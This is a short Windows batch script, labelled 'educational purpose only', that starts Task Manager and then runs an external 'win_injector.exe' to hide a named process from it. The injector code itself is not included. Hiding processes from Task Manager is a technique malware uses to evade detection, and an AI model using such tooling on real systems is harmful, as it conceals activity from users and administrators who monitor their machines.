@echo off
setlocal
echo Windows Process Hiding Tool - 64-bit Version
echo EDUCATIONAL PURPOSE ONLY
echo ========================================
echo.

if "%1"=="" (
    echo Usage: %0 ^<process_name_to_hide^>
    echo Example: %0 notepad.exe
    goto :eof
)

echo Target process to hide: %1
echo.

echo Checking if Task Manager is running...
REM Start Task Manager if it's not already running
tasklist /FI "IMAGENAME eq taskmgr.exe" 2>NUL | find /I /N "taskmgr.exe">NUL
if "%ERRORLEVEL%"=="1" (
    echo Starting Task Manager...
    start taskmgr.exe
    echo Waiting for Task Manager to initialize...
    timeout /t 5 /nobreak
) else (
    echo Task Manager is already running.
)

echo.
echo Setting environment variable...
set TARGET_PROCESS=%1

echo Running process hiding tool...
win_injector.exe %1

echo.
echo Done! If %1 is running, it should now be hidden from Task Manager.
